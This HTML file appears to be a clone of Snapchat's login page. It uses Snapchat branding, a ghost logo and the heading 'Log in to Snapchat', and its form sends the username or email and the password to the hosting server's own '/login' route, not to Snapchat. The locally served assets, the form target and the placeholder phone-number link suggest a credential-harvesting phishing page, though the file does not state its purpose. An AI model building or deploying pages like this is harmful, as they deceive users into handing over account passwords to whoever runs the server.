<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snapchat Log In</title>
    <link rel="shortcut icon" href="/static/images/snap.png" type="image/x-icon">
    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="/static/css/style.css">
</head>

<body>
    <div class="container">
        <!-- Snapchat Ghost Icon -->
        <img src="/static/images/snap.jpg" alt="Snapchat Ghost Icon" class="logo">
        <h2>Log in to Snapchat</h2>

        <!-- Log In Form -->
        <form action="/login" method="POST">
            <div class="form-group">
                <label for="usernameEmail">Username or Email</label>
                <input type="text" class="form-control" name="usernameEmail" id="usernameEmail"
                    placeholder="username or email" required>
            </div>

            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" class="form-control" name="password" id="password" placeholder="Password"
                    required>
            </div>

            <button type="submit" class="btn btn-primary btn-block">Log In</button>
        </form>


        <!-- Alternative Actions -->
        <div class="alternative-actions">
            <p><a href="#">Use phone number instead</a></p>
            
        </div>
    </div>
    <script>
        // Additional JavaScript can be added here if needed
    </script>
</body>

</html>
